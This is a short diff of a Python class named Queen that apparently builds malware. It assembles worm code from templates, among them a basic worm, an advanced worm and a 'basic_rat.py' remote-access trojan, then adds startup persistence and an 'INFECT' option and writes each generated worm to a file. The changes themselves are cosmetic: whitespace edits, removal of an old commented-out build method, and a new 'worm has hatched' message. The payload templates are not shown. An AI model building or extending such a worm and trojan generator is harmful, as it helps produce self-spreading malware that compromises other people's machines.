@@ -12,13 +12,11 @@ class Queen:
         self.make_dirs()
         self._template = {}
 
-    
 
     def make_dirs(self):
         if not os.path.exists(self.out_dir):
             os.mkdir(self.out_dir)
     
-
     def accept_config(self, **config):
         print(config)
     
@@ -62,28 +60,6 @@ class Queen:
         temp_code = Template(temp_code).render()
         return temp_code
         
-    
-
-    
-    # def hatchering(self, **config):
-    #     if not config.get("INFECT"):
-    #             config.update({"INFECT": False})
-    #     code = self._make_basic_worm(**config)
-    #     if config["SERV_TYPE"] == "Echo" or config["SERV_TYPE"] == "Test":
-    #         echo_code = self._make_empty_template("echo_temp.py")
-    #         startup = self._make_startup("EchoClient")
-    #         code += echo_code + startup
-    #         self.save_worm(code, f"{config['NAME']}_echo")
-    #     elif config["SERV_TYPE"] == "Adv":
-    #         adv_code = self._make_adv_worm()
-    #         fcode = code + adv_code
-    #         self.save_worm(fcode, f"{config['NAME']}_echo")
-    #     elif config["SERV_TYPE"] == "BasicRat":
-    #         adv_code = self._make_adv_worm()
-    #         rcode = self._make_empty_template("basic_rat.py")
-    #         startup = self._make_startup("BasicRat")
-    #         fcode = code + adv_code + rcode + startup
-    #         self.save_worm(fcode, f"{config['NAME']}_BasicRat.py")
 
     def hatchering(self, **config):
         if not config.get("INFECT"):
@@ -105,15 +81,15 @@ class Queen:
             worm_code = ""
         startup = self._make_startup(config["SERV_TYPE"])
         fcode = bcode + acode + worm_code + startup
+ 
         self.save_worm(fcode, config["NAME"], name)
-
-        
-
-
 
 
     def save_worm(self, code, serv_name, name):
         worm_name = f"{serv_name}_{name}.py"
         with open(os.path.join(self.out_dir, worm_name), "w") as f:
             f.write(code)
-        print("[QUEEN] A new worm has hatched")
+        print(f"[QUEEN] A new worm < {worm_name} > has hatched")
+
+    
+
